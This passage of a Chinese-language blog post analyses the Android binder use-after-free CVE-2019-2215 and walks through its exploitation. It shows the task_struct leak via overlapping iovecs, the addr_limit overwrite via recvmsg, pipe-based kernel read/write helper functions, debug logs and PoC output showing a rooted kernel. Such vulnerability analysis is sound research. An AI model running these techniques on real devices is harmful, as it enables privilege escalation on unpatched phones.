<p><img src="触发漏洞后的内存布局1.png" alt="触发漏洞后的内存布局.png"><br>以上是调试数据，可以看到当执行到remove_wait_queue的时候，参数q指向的task_list地址为0xffffffd7b7a3dea0，正好就是binder_poll中thread-&gt;wait的首地址，并且根据q-&gt;lock的内容为0x100010000可以确定我们用户态数据的占位是成功的，参数wait指向的task_list地址为0xffffffd86c38ed20，wait-&gt;task_list.next与wait-&gt;task_list.next都指向q-&gt;task_list，因为这task_list链表只有两个节点，所以通过链表删除操作之后则把q-&gt;task_list.next和q-&gt;task_list.prev都改为了0xffffffd7b7a3dea8(q-&gt;task_list的地址)，而task_list.next，task_list.prev分别对应上与binder_thread-&gt;wait重叠的第一个iovec的iov_len元素以及第二个iovec的iov_base，最后当用户态read的时候就会从第二个iovec的iov_base(0xffffffd7b7a3dea8)开始读iovec.iov_len的长度到用户态内存，这样我们就成功泄漏了内核数据，泄漏的数据偏移0xe8(pxiel2上面)刚好就是当前进程的task_struct结构体的地址。</p>
<h5 id="修改limit值"><a href="#修改limit值" class="headerlink" title="修改limit值"></a>修改limit值</h5><p>内核地址任意写，思路：通过上一步的内核读有了当前进程的task结构体那么下一步怎么提权呢？此时还需要构造一个内核写，通过内核写去修改进程limit的值，这样就能实现内核任意地址读写的效果。<br>首先还是需要先触发binder_thread结构体的释放。不过这次是通过socketpair函数创建一对匿名已连接套接字，通过recvmsg函数对socks[0]做接收操作，传入的参数2是一个msghdr结构体，msghdr.msg_iov指向的是我们准备好的iovec数组，让这组iovec数组去内核中占位前面释放的binder_thread结构体。iovec数组中有两个iovec刚好能与binder_thread-&gt;wait元素重合，然后使用epoll_ctl的EPOLL_CTL_DEL选项触发重引用的链表删除操作，把重合的第二个iovec结构体的iovec.iov_base的值改为binder_thread-&gt;wait.task_list的地址，再利用用户态调用write函数把需要覆盖的数据写入到socks[1]。当socks[1]中有数据的时候，recvmsg则把读取到的数据写入到iovec数组的每个iovec结构体的iov_base指向的内存，因为前面已经利用漏洞把重合的第二个iovec结构体的iovec.iov_base修改成了binder_thread-&gt;wait.task_list的地址，所以这里会直接把伪造数据写入到binder_thread-&gt;wait.task_list的地址，从而实现对指定内核地址写的操作。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> msghdr &#123;</div><div class="line">	<span class="keyword">void</span>		*msg_name;	<span class="comment">/* ptr to socket address structure */</span></div><div class="line">	<span class="keyword">int</span>		msg_namelen;	<span class="comment">/* size of socket address structure */</span></div><div class="line">	<span class="keyword">struct</span> iovec	*msg_iov;	<span class="comment">/* scatter/gather array */</span></div><div class="line">	<span class="keyword">__kernel_size_t</span>	msg_iovlen;	<span class="comment">/* # elements in msg_iov */</span></div><div class="line">	<span class="keyword">void</span>		*msg_control;	<span class="comment">/* ancillary data */</span></div><div class="line">	<span class="keyword">__kernel_size_t</span>	msg_controllen;	<span class="comment">/* ancillary data buffer length */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	msg_flags;	<span class="comment">/* flags on received message */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>具体实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">&lt;4&gt;[ 1150.931303] c3   4164 -1-[cve_2215_poc]- binder_poll- &amp;thread-&gt;wait:0xffffffcc03dfeca0</div><div class="line">&lt;4&gt;[ 1150.931303] c3   4164 -1-[cve_2215_poc]- unix_stream_read_generic-&gt;&gt;&gt;&gt;</div><div class="line">&lt;4&gt;[ 1150.932519] c3   4164 -1-[cve_2215_poc]- skb_copy_datagram_iter-&gt;&gt;&gt;&gt;</div><div class="line">&lt;4&gt;[ 1150.932593] c3   4164</div><div class="line">&lt;4&gt;[ 1150.932593] c3   4164 -1-[cve_2215_poc]- copy_to_iter- addr:58 bytes:0x1  i-&gt;count:0x31 i-&gt;iov:0xffffffcc03dfec00 i-&gt;nr_segs:0x19             </div><div class="line">&lt;4&gt;[ 1150.932650] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:0:58</div><div class="line">&lt;4&gt;[ 1150.932677] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:1:f6</div><div class="line">&lt;4&gt;[ 1152.937025] c3   4164</div><div class="line">&lt;4&gt;[ 1152.937025] c3   4164 -1-[cve_2215_poc]- skb_copy_datagram_iter-&gt;&gt;&gt;&gt;</div><div class="line">&lt;4&gt;[ 1152.937149] c3   4164</div><div class="line">&lt;4&gt;[ 1152.937149] c3   4164 -1-[cve_2215_poc]- copy_to_iter- addr:1 bytes:0x30  i-&gt;count:0x30 i-&gt;iov:0xffffffcc03dfecb0 i-&gt;nr_segs:0xe</div><div class="line">&lt;4&gt;[ 1152.937207] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:0:1</div><div class="line">&lt;4&gt;[ 1152.937236] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:1:0</div><div class="line">&lt;4&gt;[ 1152.937263] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:2:0</div><div class="line">&lt;4&gt;[ 1152.937291] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:3:0</div><div class="line">&lt;4&gt;[ 1152.937318] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:4:0</div><div class="line">&lt;4&gt;[ 1152.937345] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:5:0</div><div class="line">&lt;4&gt;[ 1152.937372] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:6:0</div><div class="line">&lt;4&gt;[ 1152.937399] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:7:0</div><div class="line">&lt;4&gt;[ 1152.937427] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:8:ef</div><div class="line">&lt;4&gt;[ 1152.937456] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:9:be</div><div class="line">&lt;4&gt;[ 1152.937484] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:a:ad</div><div class="line">&lt;4&gt;[ 1152.937512] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:b:de</div><div class="line">&lt;4&gt;[ 1152.937539] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:c:0</div><div class="line">&lt;4&gt;[ 1152.937567] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:d:0</div><div class="line">&lt;4&gt;[ 1152.937595] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:e:0</div><div class="line">&lt;4&gt;[ 1152.937622] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:f:0</div><div class="line">&lt;4&gt;[ 1152.937649] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:10:28</div><div class="line">&lt;4&gt;[ 1152.937678] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:11:0</div><div class="line">&lt;4&gt;[ 1152.937706] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:12:0</div><div class="line">&lt;4&gt;[ 1152.937733] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:13:0</div><div class="line">&lt;4&gt;[ 1152.937761] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:14:0</div><div class="line">&lt;4&gt;[ 1152.937789] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:15:0</div><div class="line">&lt;4&gt;[ 1152.937817] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:16:0</div><div class="line">&lt;4&gt;[ 1152.937845] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:17:0</div><div class="line">&lt;4&gt;[ 1152.937873] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:18:8</div><div class="line">&lt;4&gt;[ 1152.937901] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:19:2a</div><div class="line">&lt;4&gt;[ 1152.937928] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:1a:e4</div><div class="line">&lt;4&gt;[ 1152.937955] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:1b:a9</div><div class="line">&lt;4&gt;[ 1152.937983] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:1c:cc</div><div class="line">&lt;4&gt;[ 1152.938010] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:1d:ff</div><div class="line">&lt;4&gt;[ 1152.938038] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:1e:ff</div><div class="line">&lt;4&gt;[ 1152.938065] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:1f:ff</div><div class="line">&lt;4&gt;[ 1152.938092] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:20:8</div><div class="line">&lt;4&gt;[ 1152.938120] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:21:0</div><div class="line">&lt;4&gt;[ 1152.938147] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:22:0</div><div class="line">&lt;4&gt;[ 1152.938176] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:23:0</div><div class="line">&lt;4&gt;[ 1152.938203] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:24:0</div><div class="line">&lt;4&gt;[ 1152.938231] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:25:0</div><div class="line">&lt;4&gt;[ 1152.938258] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:26:0</div><div class="line">&lt;4&gt;[ 1152.938285] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:27:0</div><div class="line">&lt;4&gt;[ 1152.938312] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:28:fe</div><div class="line">&lt;4&gt;[ 1152.938340] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:29:ff</div><div class="line">&lt;4&gt;[ 1152.938368] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:2a:ff</div><div class="line">&lt;4&gt;[ 1152.938396] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:2b:ff</div><div class="line">&lt;4&gt;[ 1152.938424] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:2c:ff</div><div class="line">&lt;4&gt;[ 1152.938451] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:2d:ff</div><div class="line">&lt;4&gt;[ 1152.938479] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:2e:ff</div><div class="line">&lt;4&gt;[ 1152.938507] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:2f:ff</div><div class="line">&lt;4&gt;[ 1152.938534] c3   4164 -2-[cve_2215_poc]- copy_to_iter- addr:30:0</div><div class="line">&lt;4&gt;[ 1152.938559] c3   4164</div><div class="line">^C</div><div class="line">130|walleye:/ #</div></pre></td></tr></table></figure></p>
<p>以上为调试信息，通过日志可以看到，内核一共调用了两次skb_copy_datagram_iter函数，该函数是把通过套接字接收到的数据写到msghdr.msg_iov指向的iovec结构体数组的iov_base元素指向的内存中，属于recvmsg的底层函数。<br><img src="漏洞触发前的内存布局2.png" alt="漏洞触发前的内存布局.png"><br>第一次是把’X’(0x58)写到地址0xffffffcc03dfeca0中的指针指向的内存中。<br>第二次则比较精巧，共写0x30个字节的数据，但分两次写。<img src="触发漏洞后的内存布局2.png" alt="触发漏洞后的内存布局.png">首先取0xffffffcc03dfecb0中的值并把取得的指针用作写入地址写入0x28(0x8+2<em>0x10)个字节的数据。这里的0xffffffcc03dfecb0刚好是binder_thread-&gt;wait.task_list.prev的地址，因为漏洞的原因task_list.prev的值被修改为了task_list地址(0xffffffcc03dfeca8)，这就相当于对binder_thread-&gt;wait.task_list做写操作，写入的数据如上所示(用户态写入的伪造数据)。因为只写0x28(0x8+2</em>0x10)个字节，所以末尾的0xfffffffffffffffe并不会在这次写入，这次覆盖只是为了去把我们伪造的内核地址写到0xffffffcc03dfecc0内存中。<br><img src="写入伪造数据后的布局2.png" alt="写入伪造数据后的布局.png"><br>第二次写剩下的8个字节，因为0xffffffcc03dfecc0也属于一个iov_base，并且0xfffffffffffffffe还没开始写，所以最后的0xfffffffffffffffe就被写到前面覆盖的内核地址指向的内存中，因为这里使用的内核地址指向的是进程limit，所以实现了对进程limit的修改。<br>这里的写操作还是挺巧妙的，不得不佩服作者。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">日志代码格式</div><div class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"cve-xxx-xxx"</span>,get_current()-&gt;comm))&#123;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="内核任意读写"><a href="#内核任意读写" class="headerlink" title="内核任意读写"></a>内核任意读写</h5><p>最后我们成功修改当前进程的limit之后就可以通过pipe组合对内核内存任意读写了，有了任意读写则可以修改关键结构体达到提权的效果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> kernel_rw_pipe[<span class="number">2</span>];</div><div class="line"><span class="comment">/* 内核任意写操作 */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">kernel_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</div><div class="line">  errno = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0x1000</span>) errx(<span class="number">1</span>, <span class="string">"kernel writes over PAGE_SIZE are messy, tried 0x%lx"</span>, len);</div><div class="line">  <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], buf, len) != len) err(<span class="number">1</span>, <span class="string">"kernel_write failed to load userspace buffer"</span>);</div><div class="line">  <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], (<span class="keyword">void</span>*)kaddr, len) != len) err(<span class="number">1</span>, <span class="string">"kernel_write failed to overwrite kernel memory"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* 内核任意读操作 */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">kernel_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</div><div class="line">  errno = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0x1000</span>) errx(<span class="number">1</span>, <span class="string">"kernel writes over PAGE_SIZE are messy, tried 0x%lx"</span>, len);</div><div class="line">  <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], (<span class="keyword">void</span>*)kaddr, len) != len) err(<span class="number">1</span>, <span class="string">"kernel_read failed to read kernel memory"</span>);</div><div class="line">  <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], buf, len) != len) err(<span class="number">1</span>, <span class="string">"kernel_read failed to write out to userspace"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="Poc测试"><a href="#Poc测试" class="headerlink" title="Poc测试"></a>Poc测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">walleye:/data/local/tmp $ uname -a</div><div class="line">Linux localhost 4.4.116-gbcd0ecccd040-dirty #27 SMP PREEMPT Fri Jun 28 20:34:56 CST 2019 aarch64</div><div class="line">walleye:/data/local/tmp $ ./CVE-2019-2215</div><div class="line">Starting POC</div><div class="line">CHILD: Doing EPOLL_CTL_DEL.</div><div class="line">CHILD: Finished EPOLL_CTL_DEL.</div><div class="line">CHILD: Finished write to FIFO.</div><div class="line">writev() returns 0x2000</div><div class="line">PARENT: Finished calling READV</div><div class="line">current_ptr == 0xffffffd790a9f000</div><div class="line">CHILD: Doing EPOLL_CTL_DEL.</div><div class="line">CHILD: Finished EPOLL_CTL_DEL.</div><div class="line">recvmsg() returns 49, expected 49</div><div class="line">should have stable kernel R/W now</div><div class="line">current-&gt;mm == 0xffffffd7b358c780</div><div class="line">current-&gt;mm-&gt;user_ns == 0xffffff9ae6daf1c8</div><div class="line">kernel base is 0xffffff9ae4c80000</div><div class="line">&amp;init_task == 0xffffff9ae6da57d0</div><div class="line">init_task.cred == 0xffffff9ae6db0a08</div><div class="line">current-&gt;cred == 0xffffffd7ac1bc0c0</div><div class="line">walleye:/data/local/tmp $ uname -a</div><div class="line">Linux localhost 4.4.116-gbcd0ecccd040-dirty EXPLOITED KERNEL aarch64</div><div class="line">walleye:/data/local/tmp $</div></pre></td></tr></table></figure>
<h3 id="总结思考"><a href="#总结思考" class="headerlink" title="总结思考"></a>总结思考</h3><p>最后总结一下本次的UAF漏洞模型，动态申请的结构体变量的引用被添加到链表中，但在释放该结构体内存时并没有从链表中删除该变量的引用，导致利用该节点时出现释放后重引用的问题。一般这种链表拆卸漏洞最有可能出现内核地址任意读写漏洞。<br>申请对象内存-&gt;添加到链表-&gt;释放内存-&gt;通过链表访问对象</p>
<h3 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">2017-12-12 通过syzkaller发现该漏洞</div><div class="line">2018-02-03 Linux修复该漏洞</div><div class="line">2019-09-26 Google公司Project Zero小组发现并提交漏洞</div></pre></td></tr></table></figure>
<h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target="_blank" rel="external">公开链接</a><br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b" target="_blank" rel="external">补丁</a><br><a href="https://github.com/timwr/CVE-2019-2215">Exploit</a><br><a href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/" target="_blank" rel="external">RootDemo</a><br><a href="https://github.com/grant-h/qu1ckr00t">RootDemo</a></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://github.com">Let_go</a></p><p> <span>Link:  </span><a href="http://github.com/2019/10/08/CVE-2019-2215/">http://github.com/2019/10/08/CVE-2019-2215/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/12/05/StrandHogg漏洞-Activity劫持/" title="StrandHogg漏洞-Activity劫持"><span>< PreviousPost</span><br><span class="prevTitle">StrandHogg漏洞-Activity劫持</span></a><a class="nextSlogan" href="/2019/09/03/CVE-2018-18281/" title="CVE-2018-18281"><span>NextPost ></span><br><span class="nextTitle">CVE-2018-18281</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2019-2215"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-2215</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#背景"><span class="toc-number">1.0.1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因"><span class="toc-number">1.0.2.</span> <span class="toc-text">漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#前置知识"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞描述"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poc"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">Poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#内存的申请"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">内存的申请</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#补丁用意"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">补丁用意</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.0.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用思路"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">漏洞利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#泄漏task-struct地址"><span class="toc-number">1.0.3.1.1.</span> <span class="toc-text">泄漏task_struct地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#修改limit值"><span class="toc-number">1.0.3.1.2.</span> <span class="toc-text">修改limit值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#内核任意读写"><span class="toc-number">1.0.3.1.3.</span> <span class="toc-text">内核任意读写</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poc测试"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">Poc测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结思考"><span class="toc-number">1.0.4.</span> <span class="toc-text">总结思考</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间线"><span class="toc-number">1.0.5.</span> <span class="toc-text">时间线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关资料"><span class="toc-number">1.0.6.</span> <span class="toc-text">相关资料</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>